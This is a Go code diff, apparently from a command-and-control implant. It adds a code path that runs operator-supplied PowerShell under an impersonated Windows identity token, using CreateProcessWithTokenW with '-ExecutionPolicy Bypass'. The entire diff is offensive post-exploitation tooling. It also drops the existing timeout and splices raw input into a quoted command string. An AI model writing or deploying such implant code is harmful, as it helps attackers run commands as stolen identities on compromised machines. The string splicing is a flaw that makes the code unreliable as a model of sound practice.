@@ -36,7 +36,41 @@ func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// 5-minute timeout to prevent indefinite agent hangs from long-running scripts
+	// Check if impersonating — use CreateProcessWithTokenW path
+	tokenMutex.Lock()
+	token := gIdentityToken
+	tokenMutex.Unlock()
+
+	if token != 0 {
+		cmdLine := fmt.Sprintf(`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "%s"`, task.Params)
+		output, err := runWithToken(token, cmdLine)
+		if err != nil {
+			outputStr := strings.TrimSpace(output)
+			if outputStr != "" {
+				return structs.CommandResult{
+					Output:    fmt.Sprintf("%s\nError: %v", outputStr, err),
+					Status:    "error",
+					Completed: true,
+				}
+			}
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error executing PowerShell: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		outputStr := strings.TrimSpace(output)
+		if outputStr == "" {
+			outputStr = "Command executed successfully (no output)"
+		}
+		return structs.CommandResult{
+			Output:    outputStr,
+			Status:    "success",
+			Completed: true,
+		}
+	}
+
+	// Standard path — no impersonation
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
 	defer cancel()
 
@@ -47,9 +81,6 @@ func (c *PowershellCommand) Execute(task structs.Task) structs.CommandResult {
 		"-ExecutionPolicy", "Bypass",
 		"-Command", task.Params,
 	)
-
-	// If impersonating, run PowerShell as the impersonated identity
-	configureProcessToken(cmd)
 
 	output, err := cmd.CombinedOutput()
 
